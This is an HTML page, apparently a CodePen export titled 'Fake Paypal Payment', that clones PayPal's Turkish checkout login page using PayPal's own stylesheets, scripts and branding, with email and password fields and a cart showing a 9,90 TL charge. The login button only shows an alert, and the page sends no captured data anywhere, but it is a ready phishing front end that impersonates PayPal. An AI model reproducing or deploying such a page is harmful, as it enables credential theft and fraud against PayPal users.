<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>CodePen - Fake Paypal Payment</title>
  <link rel='stylesheet' href='https://www.paypalobjects.com/web/res/79a/f606b759665fc5646f7642b97406f/css/app.css'><link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<html>
  <head>
    <meta charset="utf-8">
    <title>Log In To PayPal</title>
  </head>

<body>
  
<div class="ng-scope">
  <div class="ng-scope">
    <div class="outerWrapper TR tr" id="outerWrapper">
    <div id="header" class="merchantHeader clearfix">
        <div class="headerWrapper">
            <!-- ngIf: !(merchant.logo_url || merchant.imageUrl) --><span class="merchantName ng-binding ng-scope" ng-if="!(merchant.logo_url || merchant.imageUrl)"></span><!-- end ngIf: !(merchant.logo_url || merchant.imageUrl) -->
            <!-- ngIf: merchant.logo_url || merchant.imageUrl -->
        </div>
    </div>
</header>
</xo-merchant-header>
    <div id="wrapper">
        <div id="main">
            <xo-header token="token" class="ng-isolate-scope"><div class="row-fluid paypalHeaderWrapper" content="">
    <div class="span14 clearfix paypalHeader">

        <!-- ngIf: unbrandedTitle -->
        <!-- ngIf: !isUnbranded --><div id="paypalLogo" class="logo ng-scope" ng-if="!isUnbranded"><span class="accessAid ng-binding"></span></div><!-- end ngIf: !isUnbranded -->

        <xo-cart token="token" render-cart-container="renderCartContainer" class="ng-isolate-scope"><!-- ngIf: showAmt || note --><div class="cartContainer ng-scope" content="" ng-if="showAmt || note">
    <div class="transactionDetailsContainer" ng-class="{cart:showCart}">

        <a href="#transactionCartDetails" class="transactionDetails scTrack:hermes-cartExpanded" aria-controls="transctionCartDetails" aria-label="Shopping cart" role="button" ng-click="toggleCart($event)">
            <!-- ngIf: showArrow --><cart-wrapper ng-if="showArrow" show-amt="showAmt" show-arrow="showArrow" token="token" class="ng-scope ng-isolate-scope"><span class="totalWrapper clearfix" id="totalWrapper">
    <span aria-label="Your Cart" id="yourCart" class="accessAid ng-binding">
        
    </span>
    <span id="transactionCart" ng-class="{hasItems:showArrow}" class="hasItems">
        <span class="cartIcon"></span>
        <!-- ngIf: showAmt --><span ng-if="showAmt" class="ng-scope">
            <format-currency class="formatCurrency ng-binding ng-isolate-scope" code="checkoutCart.purchase.amounts.total.currency_code" amount="checkoutCart.purchase.amounts.total.amount" display-code="">
                <?php echo number_format($_GET["total"], 2) ?>
            </format-currency>
        </span><!-- end ngIf: showAmt -->
        <!-- ngIf: showArrow && checkoutCart.purchase.items --><span ng-if="showArrow &amp;&amp; checkoutCart.purchase.items" class="arrow ng-scope">
    </span><!-- end ngIf: showArrow && checkoutCart.purchase.items -->
</span>
</span></cart-wrapper><!-- end ngIf: showArrow -->
        </a>

        <!-- ngIf: !showArrow -->

        <!-- ngIf: showArrow --><div class="transctionCartDetails ng-scope" aria-hidden="true" ng-if="showArrow">
            <div class="details">

                <!-- ngIf: hasItems --><div ng-if="hasItems" class="ng-scope">
                    <!-- ngIf: checkoutAppData.merchant --><h3 ng-if="checkoutAppData.merchant" class="merchantName ng-scope" ng-class="{merchantTitle: note}" id="merchantName">
                        <!-- ngIf: note -->
                        <!-- ngIf: !note --><span ng-if="!note" class="ng-binding ng-scope"></span><!-- end ngIf: !note -->
                    </h3><!-- end ngIf: checkoutAppData.merchant -->
                    <!-- ngIf: note -->
                </div><!-- end ngIf: hasItems -->

                <!-- ngIf: !hasItems -->

                <!-- ngIf: hasItems --><ul class="detail-items ng-scope" ng-if="hasItems">
                    <!-- ngRepeat: item in checkoutCart.purchase.items --><li ng-repeat="item in checkoutCart.purchase.items" class="items ng-scope">
                        <span title="Demir Paket" class="itemName ng-binding">Demir Paket</span>
                        <span class="itemPrice">
                            <format-currency code="item.amount.currency_code" amount="item.amount.amount" class="ng-binding ng-isolate-scope">9,90</format-currency>
                            <span class="currencyCode ng-binding">TL</span>
                        </span>
                    </li><!-- end ngRepeat: item in checkoutCart.purchase.items -->

                    <!-- ngIf: checkoutCart.purchase.amounts.tax -->

                    <!-- ngIf: checkoutCart.purchase.amounts.shipping -->

                    <!-- ngIf: checkoutCart.purchase.amounts.shipping_discount -->

                    <!-- ngIf: checkoutCart.purchase.amounts.handling -->

                    <!-- ngIf: checkoutCart.purchase.amounts.insurance -->
                </ul><!-- end ngIf: hasItems -->

                <!-- ngIf: hasItems && checkoutCart.purchase.amounts.total --><div class="subTotal ng-scope" ng-if="hasItems &amp;&amp; checkoutCart.purchase.amounts.total">
                    <span class="itemName ng-binding">Toplam</span>
                    <span class="itemPrice">
                        <format-currency code="checkoutCart.purchase.amounts.total.currency_code" amount="checkoutCart.purchase.amounts.total.amount" class="ng-binding ng-isolate-scope">9,90</format-currency>
                        <span class="currencyCode ng-binding">TL</span>
                    </span>
                </div><!-- end ngIf: hasItems && checkoutCart.purchase.amounts.total -->

                <a href="#" id="closeCart" role="button" class="actions" ng-click="closeCart($event)">
                    <span class="accessAid ng-binding">Kapat</span>
                </a>

            </div>
            <div class="pointer"> </div>
        </div><!-- end ngIf: showArrow -->
    </div>
</div><!-- end ngIf: showAmt || note -->
</xo-cart>
        <!-- ngIf: unbrandedSubTitle -->
        <xo-close-frame><a ng-show="isIFrame" href="" id="closeButton" target="_parent" role="button" ng-click="closeFrame($event)" class="ng-binding ng-hide">PayPal satınalma seçeneğini kapat</a>
</xo-close-frame>
    </div>
</div>
</xo-header>
            <div id="contents">
                <!-- uiView:  --><div ui-view="" class="ng-scope"><div xo-login-page="" token="token" class="ng-scope ng-isolate-scope"><section class="login" id="login" content="">
    <div class="row-fluid">
    	<div class="span14 trayInner">
            <xo-login-handler token="token" auto-login="autoLogin" success-callback="onSuccess" contingency-callback="onContingency" ul-eligibility="ulEligibility" aps-integration="apsIntegration" batch="batch" login-submit="loginSubmit" class="ng-isolate-scope"><section class="login" id="login" content="">
    <xo-message message="errorMessage" class="ng-isolate-scope"><!-- ngIf: message.msgs || message.msgKeys -->
</xo-message>
    <div class="pr row-fluid" ng-class="{hasError: errorMessage}">
        <xo-title title-txt="Login" ng-class="{span17: showLanguageDropdown}" class="ng-isolate-scope"><h1 class="alpha ng-binding">
   Log In To PayPal
</h1>
</xo-title>
        <!-- ngIf: showLanguageDropdown -->
    </div>
    <div class="inline-prop ng-isolate-scope" unless-feature="propValue"><!-- ngIf: !enabled() --></div>
    <!-- ngIf: !ulEligibility --><xo-login ng-if="!ulEligibility" token="token" auth="auth" done-fn="onComplete" error-fn="onContingency" auto-login="autoLogin" aps-integration="apsIntegration" batch="batch" login-submit="loginSubmit" class="ng-scope ng-isolate-scope"><form name="loginForm" class="proceed ng-valid-email ng-dirty ng-valid-parse ng-invalid ng-invalid-required" content="" novalidate="novalidate" autocomplete="off" ng-submit="loginForm.$valid &amp;&amp; onSubmit()" ng-class="{true: 'validated'}[validated]">
    <div class="inputField emailField confidential">
        <label for="email" class="focus accessAid ng-binding">
           mail
        </label>
        <input ng-model="auth.email" name="username" type="email" ng-readonly="auth.emailReadOnly" value="" autocapitalize="off" aria-required="false" autocomplete="off" placeholder="Email address" data-error-text="Geçerli bir e-posta adresi girin" xo-error-tooltip="" required="" autofocus="" class="ng-valid-email ng-touched ng-dirty ng-invalid ng-invalid-required"><div class="errorTooltip errorTooltipRequired ng-binding ng-scope"></div><div class="errorTooltip errorTooltipRuleSpecific"></div>
    </div>

    <div class="inputField passwordField confidential   ">
        <label for="password" class="focus accessAid ng-binding">
            Password
        </label>
        <input ng-model="auth.password" name="password" type="password" value="" aria-required="true" autocapitalize="off" autocomplete="off" placeholder="Password" xo-error-tooltip="" required="" class="ng-touched ng-dirty ng-valid-parse ng-invalid ng-invalid-required"><div class="errorTooltip errorTooltipRequired ng-binding ng-scope"></div>
    </div>

    <div ng-switch="" class="checkbox" id="rmSection" on="rememberMe">
        <!-- ngSwitchWhen: nonKmli -->
        <!-- ngSwitchWhen: kmli -->
    </div>

    <xo-tooltip trigger="#verifyHelp" display-inline="true" class="ng-isolate-scope" style="display: none;"><div class="toolTip  displayInline" ng-class="{'displayInline': displayInline, 'balloon': !displayInline}" ng-transclude="">
        <div class="keepMeLoginTerms ng-scope" id="keepMeLoginTerms">
            <p class="ng-binding"></p>
            <p class="ng-binding"></p>
            <p class="ng-binding"></p>
        </div>
    </div></xo-tooltip>

    <input track-submit="" type="button" value="Log In" class="btn full loginBtn" ng-click="validated=true" onclick="alert(123)">

    <div class="center mt10 secondary" id="forgotPasswordSection">
        <a href="https://www.paypal.com/tr/merchantpaymentweb?cmd=_account-recovery&amp;from=PayPal&amp;locale.x=tr_TR" id="forgot_password_link" target="_blank" class="smallPopup ng-binding" xo-popup="">
            Having trouble logging in?</a>
    </div>
</form>
</xo-login><!-- end ngIf: !ulEligibility -->
    <!-- ngIf: ulEligibility -->
</section></xo-login-handler>
            <!-- ngIf: flowEligibility.guest || flowEligibility.signup --><hr class="sep ng-scope" ng-if="flowEligibility.guest || flowEligibility.signup"><!-- end ngIf: flowEligibility.guest || flowEligibility.signup -->
            <!-- ngIf: flowEligibility.guest -->
            <!-- ngIf: !flowEligibility.guest && flowEligibility.signup --><a link-button="" track-link="signup" class="btn btn-secondary full submit ng-binding ng-scope" id="signupBtn" ng-if="!flowEligibility.guest &amp;&amp; flowEligibility.signup" ng-click="signup()" role="button" tabindex="0">Check Out as a Guest</a><!-- end ngIf: !flowEligibility.guest && flowEligibility.signup -->
        </div>
        <!-- ngIf: !loginDesignExp --><div class="span10 ng-scope" ng-if="!loginDesignExp">
            <xo-value-props type="login" title="." text="." class="ng-isolate-scope"><div class="props login">
    <div class="prop-img"></div>
    <h2 class="vprop-header ng-binding">Safer. Faster. Easier</h2>
    <p ng-bind-html="text" class="ng-binding">Welcome to new PayPal checkout. <br>It's everything checkout should be<br>- faster, safer and more convenient.</p>
</div>
</xo-value-props>
        </div><!-- end ngIf: !loginDesignExp -->

        <!-- ngIf: loginDesignExp -->
    </div>
</section>
</div></div>
            </div>
        </div>
        <xo-spinner><div id="spinner" class="spinner">
    <div class="spinWrap">
        <p class="loader"></p>
        <p class="loadingMessage ng-binding"></p>
    </div>
</div>
</xo-spinner>
    </div>
    <xo-footer token="token" class="ng-isolate-scope"><footer content="">
    <div class="footer clearfix commonFooter" role="contentinfo" ng-class="{APAC: isApac()}">
        <!-- <p id="defaultCancelLink" class="cancelUrl">
            <a track-link="cancel_and_return_to_merchant" href="https://minecraftity.com?token=EC-0C033035PB523150D" ng-click="cancelRedirect($event)" role="button" id="cancelLink" class="ng-binding">
               Cancel and return to UD Cabs Ltd
            </a>
        </p> -->

        <div class="footerWrapper">
            <ul class="footerLinks">
                <!-- ngRepeat: link in footerLinks() --><li class="first ng-scope" bind-html-compile="htmlContent(link.content, {country: locale.country})" ng-repeat="link in footerLinks()" id="footer_useragreement"><a href="https://www.paypal.com/tr/webapps/mpp/ua/legalhub-full?locale.x=en_TR" class="popup ng-scope" target="_blank">Terms</a></li><!-- end ngRepeat: link in footerLinks() --><li class="first ng-scope" bind-html-compile="htmlContent(link.content, {country: locale.country})" ng-repeat="link in footerLinks()" id="footer_privacy"><a href="https://www.paypal.com/tr/webapps/mpp/ua/privacy-full?locale.x=en_TR" class="popup ng-scope" target="_blank">Privacy</a></li><!-- end ngRepeat: link in footerLinks() -->
                <li class="feedback last">
                    <!-- ngIf: showFeedback() --><a ng-if="showFeedback()" href="#" id="footer_sfLink" ng-click="showOL($event)" class="ng-binding ng-scope">Feedback</a><!-- end ngIf: showFeedback() -->
                </li>
            </ul>
            <p class="copyright ng-binding">
                © 1999 - 2020
                <span class="secureIcon"></span>
            </p>
            <xo-escape-hatch><button ng-show="isIFrame" title="T" class="btn escapeHatch ng-hide" ng-click="closeFrame()"><span class="accessAid ng-binding"></span></button>
</xo-escape-hatch>
        </div>

        <!-- ngIf: showPolicyInfo() -->

    </div>
    <div class="modal-wrapper ng-hide" ng-show="show">
	<div class="modal-overlay" ng-click="hideModal()"></div>
	<div class="modal-dialog">
		<div class="modalContent" ng-transclude="">
        <p class="ng-binding ng-scope"></p>
        <p class="popLink ng-binding ng-scope"></p>
        <input class="btn btn-submit full ng-scope" type="button" ng-click="hideModal()" value="Tamam">
    </div>
	</div>
</div>
</footer></xo-footer>
    <xo-login-overlay token="token" class="ng-isolate-scope"><!-- ngIf: showOverlay -->

</xo-login-overlay>
</div>
</div></div>

















        


<script src="https://www.paypalobjects.com/web/res/79a/f606b759665fc5646f7642b97406f/locales/TR/tr.js"></script><script src="https://www.paypalobjects.com/webstatic/r/fb/fb-all-prod.pp.min.js"></script><img src="https://www.paypalobjects.com/en_US/i/scr/btn_tracking_pixel.gif?teal=null&amp;Id=null&amp;ru=null&amp;fltk=EC-0C033035PB523150D&amp;calc=3f4b031082ff3&amp;page=main:ec:hermes::fullpage-login:member:hermes:&amp;xe=1244,1245&amp;xt=2860,2847&amp;fpti=4fbc3aee14f0a491eea412a4fdc648ec&amp;WWW_AKA_MVT_BUTTONS=null&amp;WWW_AKA_MVT_ID=null&amp;ip=88.230.30.47&amp;mrid=APKKTH6AAHFBA&amp;calf=5be9bc7c5d51b"><div id="SwfStore_PayPalLSO_0" style="position: absolute; top: -2000px; left: -2000px;"><object height="100" width="500" codebase="https://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" id="SwfStore_PayPalLSO_1" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000">	<param value="https://www.paypalobjects.com/webstatic/r/fb/ppfn.swf" name="movie">	<param value="logfn=SwfStore.PayPalLSO.log&amp;onload=SwfStore.PayPalLSO.onload&amp;onerror=SwfStore.PayPalLSO.onerror&amp;LSOPath=/&amp;LSOName=PayPalLSO&amp;datafn=SwfStore.PayPalLSO.datafn" name="FlashVars">	<param value="always" name="allowScriptAccess">	<embed height="375" align="middle" width="500" pluginspage="https://www.macromedia.com/go/getflashplayer" flashvars="logfn=SwfStore.PayPalLSO.log&amp;onload=SwfStore.PayPalLSO.onload&amp;onerror=SwfStore.PayPalLSO.onerror&amp;LSOPath=/&amp;LSOName=PayPalLSO&amp;datafn=SwfStore.PayPalLSO.datafn" type="application/x-shockwave-flash" allowscriptaccess="always" quality="high" loop="false" play="true" name="SwfStore_PayPalLSO_1" bgcolor="#ffffff" src="https://www.paypalobjects.com/webstatic/r/fb/ppfn.swf"></object></div></body></html>
<!-- partial -->
  
</body>
</html>
